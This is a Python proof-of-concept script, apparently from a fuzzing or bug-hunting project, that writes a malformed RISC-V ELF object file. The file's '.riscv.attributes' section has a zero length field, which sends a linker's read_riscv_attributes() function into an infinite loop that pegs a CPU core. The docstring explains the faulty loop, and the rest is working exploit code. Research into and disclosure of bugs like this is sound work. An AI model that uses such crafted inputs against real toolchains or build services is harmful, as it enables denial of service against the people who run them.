#!/usr/bin/env python3
"""Third, independent malformed ".riscv.attributes" section, targeting a genuinely
DIFFERENT bug *class* in the same function (read_riscv_attributes(), src/input-files.cc):
an infinite loop / CPU-exhaustion hang, not a memory-safety crash.

    while (!data.empty()) {
      i64 sz = *(U32<E> *)data.data();
      ...
      std::string_view p(data.data() + 4, sz - 4);
      data = data.substr(sz);          // <-- if sz == 0, data is UNCHANGED

      if (!p.starts_with("riscv\0"sv))
        continue;                      // <-- back to the top with unchanged `data`
      ...
    }

If sz == 0 AND the bytes right after the 4-byte sz field do NOT spell "riscv\0", the
`continue` fires every time and `data` never advances (`data.substr(0)` is a no-op) -
the outer `while (!data.empty())` loop spins forever, pegging one CPU core at 100%.

This is the same bug *class* already confirmed elsewhere in this project (candidate 007,
a thin-archive member-skip loop with the same "continue before the cursor advances" shape).
"""
import struct
import sys


def build() -> bytes:
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8  # ELFCLASS64, ELFDATA2LSB

    # sz = 0, followed by junk that does NOT spell "riscv\0" -> the vendor-name check
    # fails every iteration, `continue` fires, and since sz == 0 the cursor never moves.
    attr_body = b"A" + struct.pack("<I", 0) + b"XXXXXXXXXXXXXXXX"

    shstrtab = b"\x00.riscv.attributes\x00.shstrtab\x00"
    name_attr = 1
    name_shstrtab = 1 + len(".riscv.attributes") + 1

    off_attr = 64
    off_shstrtab = off_attr + len(attr_body)
    off_shdrs = off_shstrtab + len(shstrtab)
    pad = (-off_shdrs) % 8
    off_shdrs += pad

    SHT_RISCV_ATTRIBUTES = 0x70000003

    ehdr = e_ident + struct.pack(
        "<HHIQQQIHHHHHH",
        1,    # e_type = ET_REL
        243,  # e_machine = EM_RISCV
        1,    # e_version
        0,    # e_entry
        0,    # e_phoff
        off_shdrs,  # e_shoff
        0,    # e_flags
        64,   # e_ehsize
        0,    # e_phentsize
        0,    # e_phnum
        64,   # e_shentsize
        3,    # e_shnum
        2,    # e_shstrndx
    )
    assert len(ehdr) == 64

    def shdr(name, type_, flags, offset, size):
        return struct.pack("<IIQQQQIIQQ", name, type_, flags, 0, offset, size, 0, 0, 1, 0)

    sh_null = shdr(0, 0, 0, 0, 0)
    sh_attr = shdr(name_attr, SHT_RISCV_ATTRIBUTES, 0, off_attr, len(attr_body))
    sh_shstrtab = shdr(name_shstrtab, 3, 0, off_shstrtab, len(shstrtab))  # SHT_STRTAB

    return ehdr + attr_body + shstrtab + b"\x00" * pad + sh_null + sh_attr + sh_shstrtab


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil_hang.o"
    with open(out_path, "wb") as f:
        f.write(build())


if __name__ == "__main__":
    main()
